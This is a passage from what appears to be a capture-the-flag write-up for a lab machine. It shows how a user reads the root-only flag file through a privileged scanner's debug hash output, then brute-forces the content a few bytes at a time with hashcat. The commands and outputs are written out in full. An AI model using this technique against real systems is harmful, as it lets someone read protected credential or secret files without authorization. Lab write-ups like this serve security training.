    	Maximum bytes of files being checked to hash. Files smaller than this value will be fully hashed. Smaller values are much faster but prone to false positives. (default 500)
  -p	[Debug] Print calculated file hash. Only compatible with -c
  -s string
    	Specific hash to check against. Not compatible with -h
greg@intentions:/opt/scanner$ 
```
# Reading root flag
##### MD5 contents of file 1-4 bytes at a time

Below is an example of the method used to read the root flag. 

```
greg@intentions:/opt/scanner$ ./scanner -c /root/root.txt -h ~/dmca_hashes.test -p -l 1
[DEBUG] /root/root.txt has hash a87ff679a2f3e71d9181a67b7542122c
greg@intentions:/opt/scanner$ ./scanner -c /root/root.txt -h ~/dmca_hashes.test -p -l 2
[DEBUG] /root/root.txt has hash b99aeb1f6ed83efbe5042fb3a4318cb3
greg@intentions:/opt/scanner$ ./scanner -c /root/root.txt -h ~/dmca_hashes.test -p -l 3
[DEBUG] /root/root.txt has hash bae5cace67bdd73084ca538c13530464
greg@intentions:/opt/scanner$ ./scanner -c /root/root.txt -h ~/dmca_hashes.test -p -l 4
[DEBUG] /root/root.txt has hash 93dccde5576d112182339a5bfbf0cb30
greg@intentions:/opt/scanner$ ./scanner -c /root/root.txt -h ~/dmca_hashes.test -p -l 8
[DEBUG] /root/root.txt has hash d178d336c947cead5b3f43f27a11e756
greg@intentions:/opt/scanner$ 
```
###### Bruteforcing with hashcat
`hashcat -a 3 -m 0 a87ff679a2f3e71d9181a67b7542122c known?a?a?a?a`
`hashcat -a 3 -m 0 b99aeb1f6ed83efbe5042fb3a4318cb3 knownbytes?a?a?a?a`
`hashcat -a 3 -m 0 bae5cace67bdd73084ca538c13530464 knownbytesetc?a?a?a?a`

